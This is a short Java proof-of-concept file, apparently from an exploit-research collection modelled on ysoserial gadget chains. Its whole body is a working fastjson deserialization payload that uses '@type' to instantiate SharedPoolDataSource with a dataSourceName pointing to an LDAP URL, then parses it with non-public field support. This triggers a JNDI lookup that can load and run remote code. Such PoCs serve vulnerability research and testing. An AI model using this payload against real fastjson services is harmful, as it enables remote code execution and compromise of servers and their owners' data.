package ysoserial.payloads.tabbyGadgetChains.Jetty;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Poc2 {
    public static void main(String[] args) {
        String poc = "{\"@type\":\"org.apache.commons.dbcp.datasources.SharedPoolDataSource\",\"dataSourceName\":\"ldap://127.0.0.1:8990/exp\"}";;
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
